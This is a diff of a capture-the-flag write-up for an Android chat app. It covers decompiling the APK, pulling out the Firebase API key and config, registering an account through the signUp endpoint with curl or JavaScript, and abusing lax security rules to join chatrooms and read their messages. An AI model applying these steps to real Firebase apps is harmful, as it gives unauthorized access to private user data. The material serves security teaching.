@@ -1,4 +1,21 @@
-Assuming reverse engineered the application, obtained the firebase config and noticed the collection structure by observing the decompiled code
+## Skills required: apk reverse engineering, firebase pentesting
+
+In this challenge participants shall receive an `.apk` file of an instant messaging app.
+
+The .apk file is not obfuscated and can be [reverse-engineered in many ways](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/apk-decompilers). I used [jadx and jadx-gui](https://github.com/skylot/jadx).
+
+From `resources.arsc/res/values/strings.xml` or `resources/res/values/strings.xml`, you can see the strings used in the application, which [hopefully will contain interesting strings](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting#basic-understanding-of-the-application-manifest.xml-strings.xml)
+
+![jadx](../../_resources/edede87694e6e4366f2cb25cc9c05657.png)
+
+We can also look at the various decompiled code to find out what the app can do.
+
+- There's no sign up functionality, only log in.
+- Users can join chatrooms, read their messages and send messages once logged in
+
+We are not seeing many security measures on the app because they are (and supposed to be) managed by Firebase.
+
+[It is therefore fine even if the application doesn't have sign up functionalities.](https://appsec-labs.com/portal/firebase-applications-the-untold-attack-surface/)
 
 Sign up yourself with the API key by refering to 
 
@@ -15,19 +32,78 @@ curl --request POST \
   "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAS4ptyTHqvFh0tviMbWV9gzIr7bMo0eCY"
 ```
 
-There are 3 collection
+OR use the JavaScript interface:
+
+```html
+<script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-auth.js"></script>
+
+<script>
+    /*
+    * Insert your target's application config in the firebaseConfig object below.
+    * This information exists in the client-side and visible to everyone.
+    */
+const firebaseConfig = {
+    apiKey: 'AIzaSyAS4ptyTHqvFh0tviMbWV9gzIr7bMo0eCY',
+    authDomain: 'https://instantchat-66091-default-rtdb.firebaseio.com',
+    databaseURL: 'https://instantchat-66091-default-rtdb.firebaseio.com',
+    projectId: 'instantchat-66091'
+};
+
+app = firebase.initializeApp(firebaseConfig);
+authService = firebase.auth();
+authService.createUserWithEmailAndPassword('appsec@pwn.com', '123456789').then( creds => {
+    console.log(`Account created (${creds.user.email})`);
+}).catch(()=>{}).finally(()=>{
+  return authService.signInWithEmailAndPassword('appsec@pwn.com', '123456789')
+}).then(console.log);
+
+</script>
+```
+
+Either way you can get the `idtoken`, which can be [appended](https://firebase.google.com/docs/database/rest/auth) to the [RESTful API calls](https://firebase.google.com/docs/reference/rest/database) to access the various resources.
+
+There are 3 collections and 5 endpoints of interest obtainable from reverse engineering the APK:
 
 ```
 messages
 users
 chatrooms
+
+/messages/{CHATROOM_ID}
+/users/
+/users/{uid}/profile/
+/chatrooms/
+/chatrooms/{uuid}/chatroom
 ```
 
-by reverse engineering the APK and you can test access control manually. I used https://github.com/iosiro/baserunner
+Access control can be tested manually. I used https://github.com/iosiro/baserunner but for beginners, even poking around in Burp Suite Repeater will do.
 
-The following is the firebase security rule. Should share this rule? However, the vulnerability is quite easy to spot.
+Use this config:
 
+```json
+{
+  "apiKey": "AIzaSyAS4ptyTHqvFh0tviMbWV9gzIr7bMo0eCY",
+  "authDomain": "instantchat-66091-default-rtdb.firebaseio.com",
+  "databaseURL": "https://instantchat-66091-default-rtdb.firebaseio.com",
+  "projectId": "instantchat-66091",
+  "storageBucket": "instantchat-66091.appspot.com",
+  "appId": "1:204796949431:android:8b3f79c75f2559c452ee32"
+}
 ```
+
+Add yourself to the participant of the chatroom:
+
+![43c5a6fadaa0ceae8e0aa8d7c3df8649.png](../../_resources/43c5a6fadaa0ceae8e0aa8d7c3df8649.png)
+
+And then read the chatroom messages:
+
+![a95457ec96932e58c665c2a07df21636.png](../../_resources/a95457ec96932e58c665c2a07df21636.png)
+
+
+For reference, the firebase security rule is as follows.
+
+```json
 {
   "rules": {
     ".write": false,
@@ -38,7 +114,15 @@ The following is the firebase security rule. Should share this rule? However, th
     },
     "chatrooms" : {
       ".read" : "auth != null",
-      ".write" : "auth != null",
+      ".write" : "!data.exists() || !newData.exists() && auth != null",
+      "$chatroomid":{
+        "chatroom":{
+          "participants":{
+            ".write":"auth != null"
+          }
+        }
+
+      }
     },
     "messages" : {
       "$messageid" : {
@@ -51,26 +135,3 @@ The following is the firebase security rule. Should share this rule? However, th
   }
 }
 ```
-
-You will see only message has some sort of access control enforced.
-
-Use this config
-
-```
-{
-  "apiKey": "AIzaSyAS4ptyTHqvFh0tviMbWV9gzIr7bMo0eCY",
-  "authDomain": "instantchat-66091-default-rtdb.firebaseio.com",
-  "databaseURL": "https://instantchat-66091-default-rtdb.firebaseio.com",
-  "projectId": "instantchat-66091",
-  "storageBucket": "instantchat-66091.appspot.com",
-  "appId": "1:204796949431:android:8b3f79c75f2559c452ee32"
-}
-```
-
-Add yourself to the participant of the chatroom as such
-
-![43c5a6fadaa0ceae8e0aa8d7c3df8649.png](../../_resources/43c5a6fadaa0ceae8e0aa8d7c3df8649.png)
-
-Read the chatroom as such
-
-![a95457ec96932e58c665c2a07df21636.png](../../_resources/a95457ec96932e58c665c2a07df21636.png)
